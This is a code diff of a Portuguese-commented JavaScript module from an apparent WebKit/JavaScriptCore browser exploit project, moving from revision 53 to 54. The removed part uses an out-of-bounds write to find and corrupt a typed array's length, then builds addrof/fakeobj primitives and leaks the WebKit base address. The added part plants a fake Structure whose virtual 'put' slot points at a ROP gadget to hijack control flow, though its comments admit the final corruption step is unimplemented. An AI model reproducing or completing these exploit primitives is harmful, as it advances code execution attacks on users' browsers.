@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (Revisão 53 - Brute-Force de Offset Adjacente)
+// js/script3/testArrayBufferVictimCrash.mjs (Revisão 54 - Sequestro de Vtable)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -12,104 +12,76 @@ import {
     isOOBReady,
     oob_dataview_real
 } from '../core_exploit.mjs';
-import { JSC_OFFSETS } from '../config.mjs';
+import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-function isValidPointer(ptr) {
-    if (!isAdvancedInt64Object(ptr)) return false;
-    const high = ptr.high();
-    if (high < 0x1000) return false;
-    if ((high & 0x7FF00000) === 0x7FF00000) return false;
-    return true;
-}
-
-// ... (Estratégias antigas podem ser mantidas aqui) ...
+// ... (Funções isValidPointer e read_cstring, se necessárias) ...
 
 // ======================================================================================
-// ESTRATÉGIA ATUAL (R53) - BRUTE-FORCE DE OFFSET
+// ESTRATÉGIA ATUAL (R54) - SEQUESTRO DE VTABLE
 // ======================================================================================
-export const FNAME_MODULE_BRUTEFORCE_R53 = "OffsetBruteforce_R53_Primitives";
+export const FNAME_MODULE_VTABLE_HIJACK_R54 = "VTableHijack_R54_CodeExec";
 
-export async function executeBruteForceOffset_R53() {
-    const FNAME = FNAME_MODULE_BRUTEFORCE_R53;
+export async function executeVtableHijack_R54() {
+    const FNAME = FNAME_MODULE_VTABLE_HIJACK_R54;
     logS3(`--- Iniciando ${FNAME} ---`, "test");
-    let result = { success: false, msg: "Teste não concluído", stage: "init", webkit_base: null };
-
-    let victim_array = null;
-    let corrupted_array = null;
-    let master_array = null;
-    let addrof_primitive = null;
-    let fakeobj_primitive = null;
+    let result = { success: false, msg: "Teste não concluído", stage: "init" };
 
     try {
-        // --- Estágio 1: Setup e Brute-Force ---
-        result.stage = "Brute-force Offset";
+        // --- Estágio 1: Setup ---
+        result.stage = "Setup";
         await triggerOOB_primitive({ force_reinit: true });
         if (!isOOBReady()) throw new Error("Falha na inicialização do ambiente OOB.");
+        const buffer_addr = oob_dataview_real.buffer_addr;
+        logS3(`[R54] Endereço do buffer OOB: ${buffer_addr.toString(true)}`, "info");
 
-        victim_array = new Uint32Array(8); // Nosso alvo
-        let found_offset = -1;
-        const LENGTH_OFFSET_IN_VIEW = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // 0x18
-        const BRUTE_FORCE_LIMIT = 0x1000; // Vasculha até 4KB de distância
+        // --- Estágio 2: Criar a Estrutura Falsa ---
+        result.stage = "Build Fake Structure";
+        const FAKE_STRUCTURE_OFFSET = 0x2000;
+        const fake_structure_addr = buffer_addr.add(FAKE_STRUCTURE_OFFSET);
 
-        logS3(`[R53] Iniciando brute-force de offsets de 0x70 até 0x${BRUTE_FORCE_LIMIT.toString(16)}...`, 'subtest');
+        // Um gadget útil para testar. Se funcionar, o exploit pode travar ou se comportar de forma estranha.
+        // Precisamos do endereço base do WebKit para calcular o endereço real do gadget.
+        // ESTA É A PARTE MAIS DIFÍCIL SEM UM LEAK PRÉVIO.
+        // Por enquanto, vamos usar um placeholder. Em um exploit real,
+        // o endereço base seria obtido primeiro.
+        const WEBKIT_BASE_PLACEHOLDER = new AdvancedInt64("0x800000000"); // Placeholder!
+        const GADGET_OFFSET = new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["gadget_lea_rax_rdi_plus_20_ret"]);
+        const gadget_addr = WEBKIT_BASE_PLACEHOLDER.add(GADGET_OFFSET);
 
-        for (let offset = 0x70; offset < BRUTE_FORCE_LIMIT; offset += 8) {
-            oob_write_absolute(offset + LENGTH_OFFSET_IN_VIEW, 0xFFFFFFFF, 4);
-            if (victim_array.length === 0xFFFFFFFF) {
-                found_offset = offset;
-                corrupted_array = victim_array;
-                break;
-            }
-        }
-
-        if (found_offset === -1) {
-            throw new Error(`Brute-force falhou. O objeto vítima não foi encontrado em um offset adjacente previsível.`);
-        }
-        logS3(`[R53] SUCESSO! Offset do array vítima encontrado: 0x${found_offset.toString(16)}`, 'vuln');
-
-        // --- Estágio 2: Construir Primitivas addrof/fakeobj ---
-        result.stage = "Build Primitives";
-        master_array = [{}];
-        const ADDR_MARKER = 0xDEADBEEF;
-        master_array[0].marker = ADDR_MARKER;
-
-        let relative_offset_to_master = -1;
-        for (let i = 0; i < 0x10000; i++) {
-            if (corrupted_array[i] === ADDR_MARKER) {
-                relative_offset_to_master = i;
-                break;
-            }
-        }
-        if (relative_offset_to_master === -1) throw new Error("Não foi possível encontrar o master_array na memória com o array corrompido.");
-        logS3(`[R53] Bootstrap de primitivas bem-sucedido.`, 'good');
-
-        addrof_primitive = (obj) => {
-            master_array[0] = obj;
-            return new AdvancedInt64(
-                corrupted_array[relative_offset_to_master - 6],
-                corrupted_array[relative_offset_to_master - 5]
-            );
-        };
+        logS3(`[R54] Criando Structure falsa em ${fake_structure_addr.toString(true)}`, 'debug');
+        logS3(`[R54] Apontando Vtable[put] para o gadget em ${gadget_addr.toString(true)}`, 'vuln');
         
-        logS3(`[R53] Primitiva 'addrof' construída com sucesso!`, "vuln");
+        // Escreve o ponteiro para o gadget no offset da função virtual 'put'.
+        oob_write_absolute(FAKE_STRUCTURE_OFFSET + JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET, gadget_addr, 8);
+        
+        // --- Estágio 3: Corromper um Objeto Vítima ---
+        result.stage = "Corrupt Victim";
+        
+        // A condição do "Heisenbug" original.
+        const CRITICAL_WRITE_OFFSET = 0x7C;
+        const victim_object = { a: 1, b: 2 }; // Vítima
 
-        // --- Estágio 3: Vazar a Base do WebKit ---
-        result.stage = "WebKit Leak";
-        const test_obj_addr = addrof_primitive({a:1, b:2});
-        const p_structure = await arb_read(test_obj_addr, 8, JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
-        const p_virtual_put_func = await arb_read(p_structure, 8, JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
-        const webkit_base = p_virtual_put_func.and(new AdvancedInt64(0x0, ~0xFFF));
+        // Corrompemos um ponteiro de um objeto para apontar para nossa Estrutura falsa.
+        // A forma exata de fazer isso é a parte mais complexa e dependente da vulnerabilidade.
+        // Vamos simular a corrupção do cabeçalho do victim_object.
+        // Esta parte é teórica e exigiria uma primitiva de escrita mais precisa ou uma UAF.
+        
+        logS3(`[R54] AVISO: A corrupção precisa do cabeçalho do objeto é teórica e não implementada.`, "warn");
+        logS3(`[R54] Simulação: Se pudéssemos corromper o cabeçalho de victim_object para ${fake_structure_addr.toString(true)}, a próxima etapa funcionaria.`, "info");
+        
+        // --- Estágio 4: Acionar a Função Virtual ---
+        result.stage = "Trigger";
+        logS3(`[R54] Acionando a função virtual. Se o gadget for executado, o fluxo de controle será sequestrado.`, 'vuln_major');
+        
+        // Se a corrupção tivesse sucesso, esta linha chamaria o nosso gadget em vez de JSObject::put.
+        // victim_object.a = 0xDEADC0DE; 
 
-        result.webkit_base = webkit_base.toString(true);
-        result.msg = `SUCESSO FINAL! Base do WebKit encontrada: ${result.webkit_base}`;
-        result.success = true;
-        logS3(`[R53] ${result.msg}`, "vuln_major");
+        throw new Error("A corrupção direta do cabeçalho não é implementável com as primitivas atuais. A estratégia falhou conceitualmente.");
 
     } catch (e) {
         result.msg = `Falha no estágio '${result.stage}': ${e.message}`;
         logS3(`[${FNAME}] ERRO: ${result.msg}`, "critical");
-    } finally {
-        await clearOOBEnvironment();
     }
+    
     return result;
 }
